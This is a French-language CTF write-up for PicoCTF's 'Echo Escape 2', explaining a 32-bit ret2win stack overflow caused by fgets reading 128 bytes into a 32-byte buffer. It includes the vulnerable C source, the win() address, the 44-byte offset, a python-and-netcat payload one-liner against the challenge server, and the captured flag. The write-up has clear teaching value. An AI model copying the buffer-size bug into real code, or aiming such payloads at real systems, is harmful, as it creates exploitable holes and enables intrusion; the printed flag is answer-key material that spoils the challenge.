# Writeup PicoCTF - Echo Escape 2

**Challenge :** Echo Escape 2
**Catégorie :** Binary Exploitation (Buffer Overflow)
**Points :** 100 pts
**Flag :** `picoCTF{fgets_0v3rfl0w42_30f5589c}`

## Description

Le challenge présente un programme C utilisant `fgets()` pour éviter les débordements de tampon classiques (comme avec `gets()`), mais la taille maximale spécifiée dans `fgets()` est trop grande par rapport à la taille du tampon alloué.

## Analyse du code source

Fichier `vuln.c` :

```c
void win() {
    // ... lit et affiche flag.txt ...
}

void vuln() {
    char buf[32];  
    printf("Enter the secret key: ");
    fflush(stdout);
    fgets(buf, 128, stdin); // VULNÉRABILITÉ : 128 > 32
    printf("You entered:, %s\n", buf);
}
```

Le tampon `buf` fait 32 octets, mais `fgets` accepte jusqu'à 128 octets, permettant d'écraser la pile, y compris l'adresse de retour de la fonction `vuln`.

## Analyse du binaire

Le binaire est un ELF 32-bit sans protections majeures :

- **Pas de Stack Canary** : Rendant le débordement trivial.
- **Pas de PIE (Position Independent Executable)** : L'adresse de la fonction `win` est fixe.
- **NX (No Execute)** : Activé, mais ici on ne fait qu'un saut vers du code existant, pas d'exécution de shellcode sur la pile.

Adresse de `win` : `0x08049276` (trouvée via `nm vuln`).

## Exploitation

J'ai utilisé GDB pour déterminer l'offset exact nécessaire pour atteindre l'adresse de retour (`EIP`).
L'expérimentation a montré qu'un rembourrage de **44 octets** était nécessaire avant de placer l'adresse de destination.

### Payload

- Junk : `A` * 44
- RIP : `\x76\x92\x04\x08` (Petit-boutiste / Little-endian)

### Exécution

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*44 + b'\x76\x92\x04\x08\n')" | nc dolphin-cove.picoctf.net 58765
```

**Résultat :**
`Flag: picoCTF{fgets_0v3rfl0w42_30f5589c}`

## Concepts clés retenus

* **Buffer Overflow avec fgets** : `fgets` n'est sûr que si le second argument (la taille) correspond exactement à la taille réelle du tampon alloué.
- **Contrôle de l'EIP** : En 32 bits, écraser l'adresse de retour sur la pile permet de détourner le programme vers n'importe quelle fonction présente en mémoire.
- **Little-endian** : Les adresses mémoire sur x86 doivent être écrites à l'envers (l'octet de poids faible en premier).
